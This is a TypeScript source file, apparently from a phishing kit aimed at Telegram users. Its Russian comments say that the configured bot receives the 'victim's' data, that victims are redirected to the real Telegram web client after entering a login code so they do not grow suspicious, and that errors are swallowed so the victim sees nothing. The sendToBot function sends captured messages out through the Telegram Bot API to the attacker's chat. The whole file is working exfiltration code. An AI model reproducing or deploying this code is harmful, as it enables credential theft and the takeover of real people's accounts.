// ─── CONFIG ───────────────────────────────────────────────────────────────────
// Замени на своё перед деплоем
export const CONFIG = {
  // Telegram Bot API токен (куда летят данные жертвы)
  BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",
  // ID чата/канала куда бот шлёт уведомления
  CHAT_ID: "YOUR_CHAT_ID_HERE",
  // После ввода кода — редирект на реальный Telegram (не вызывает подозрений)
  REDIRECT_URL: "https://web.telegram.org/",
};

// Отправить данные через Telegram Bot API
export async function sendToBot(message: string): Promise<void> {
  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CONFIG.CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch {
    // silent fail — жертва ничего не видит
  }
}
